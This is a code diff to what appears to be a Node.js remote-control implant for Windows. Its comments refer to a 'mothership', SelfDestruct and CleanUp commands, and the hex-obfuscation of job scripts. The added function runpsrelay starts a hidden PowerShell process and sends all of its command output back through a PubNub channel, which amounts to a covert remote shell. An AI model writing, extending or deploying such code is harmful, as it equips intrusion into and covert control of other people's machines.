@@ -21,13 +21,9 @@ const ISDEBUG = true;
 // { CommandLine:'...', Name:'...', ProcessId:'...' }
 var processlist = [];
 
-// ! logging
-
-// ! all job scripts need to be obfuscated using hex string -- no file extensions, no filenames
-
-// TODO: implement IPC between ping and cmdlist using watchdog pub/sub
-//       ! change in mothership should be communicated to cmdlist and watchdog
-//       + ping informs cmdlist new job in queue
+// ! fix up supported script engines
+// ! logging: review all logmsg calls
+// ! read/write/parse/retrieve config
 
 // TODO: retrieve nircmdc and use it to grab process names -- need to upgrade isCmdRunning
 //       to inspect the process name as well as pid
@@ -40,11 +36,8 @@ var processlist = [];
 // ! creating/deleting/query tasks and registry not natively supported by node, have to implement
 // bat/cmd, ps1, vbs failover
 
-// TODO: read/write/parse/retrieve config
 
-// EXEC_CMD --> startnoderelay, stopnoderelay
-//              startpythonrelay, stoppythonrelay
-//              startpcmon, stoppcmon
+// EXEC_CMD --> StartPCMon, StopPCMon
 //              startpspcmon, stoppspcmon
 
 // EXEC_CMD --> GetSystemOverview
@@ -56,8 +49,6 @@ var processlist = [];
 //              InstallNode
 //              CleanUp
 //              SelfDestruct
-
-// EXEC_VBS, EXEC_PS1, EXEC_BAT, EXEC_JS, EXEC_PY
 
 var process_argv = [];
 
@@ -761,24 +752,23 @@ class PubnubRelay {
     };
 
     publishMessage(payload) {
-        logmsg('starting');
         
         this.pubnubConnection.publish({
             channel: this.client_channel,
             message: payload
         })
-        .then((response) => {
-            logmsg('Message sent successfully! Timetoken:', response.timetoken);
-            
+        .then((response) => {            
             payload.response = response;
 
             this.payloads.push(payload);
+
+            logmsg('message sent -- timetoken:' + response.timetoken + ' payloads: '+this.payloads.length);
+
         })
         .catch((error) => {
             logmsg('Publish failed:', error);
         });
      
-        logmsg('finished');
     }
     
 };
@@ -1525,11 +1515,65 @@ function runpythonrelay(pubnubo) {
 
 }
 
-function runvbsrelay(pubnubo) {
-
-}
-
+// anchor
 function runpsrelay(pubnubo) {
+
+    const child = spawn('powershell.exe', ['-NoProfile', '-Command', '-'], {
+        shell: false,
+        // detached: true, // causes problems
+        windowsHide: true,
+        cwd: "",
+    });
+
+    let tchildproc = getProcess(child.pid);
+    // CommandLine
+    // Name
+    // ProcessId
+
+    child.stdout.on('data', (data) => {
+        const str = Buffer.from(data).toString(); 
+
+        logmsg(`STDOUT: ${str}`);
+
+        pubnubo.publishMessage( { execresult:str, ts:getTimestamp(), responseid:getRandomCode(8) } );
+    });
+
+    child.stdout.on('error', (err) => {
+        logmsg('STDOUT error:', err);
+    });
+
+    child.stderr.on('data', (data) => {
+        const str = Buffer.from(data).toString(); 
+
+        logmsg(`STDERR: ${str}`);
+
+        pubnubo.publishMessage( { execresult:str, ts:getTimestamp() } );
+    });
+
+    child.stdin.on('error', (err) => {
+        if (err.code === 'EPIPE') {
+            logmsg('Subprocess closed stdin early; ignoring broken pipe.');
+        } else {
+            logmsg('Unexpected STDIN error:', err);
+        }
+    });
+
+    child.on('close', (code) => {
+        logmsg(`script engine exited with code ${code}`);
+    });
+
+    child.on('error', (err) => {
+        logmsg('Failed to start subprocess:', err);
+    });
+
+    logmsg(`launched child pid=${child.pid} spawn args: ` + JSON.stringify(child.spawnargs) + ' tchildproc: ' + JSON.stringify(tchildproc));
+
+    // log event to mothership
+    // TODO log to pubnub
+    
+    logmsg('finished');
+
+    return child;
 
 }
 
@@ -1553,7 +1597,7 @@ function runnoderelay(pubnubo) {
 
         logmsg(`Output: ${str}`);
 
-        pubnubo.publishMessage( { execresult:str, ts:getTimestamp() } );
+        pubnubo.publishMessage( { execresult:str, ts:getTimestamp(), responseid:getRandomCode(8) } );
     });
 
     child.stdout.on('error', (err) => {
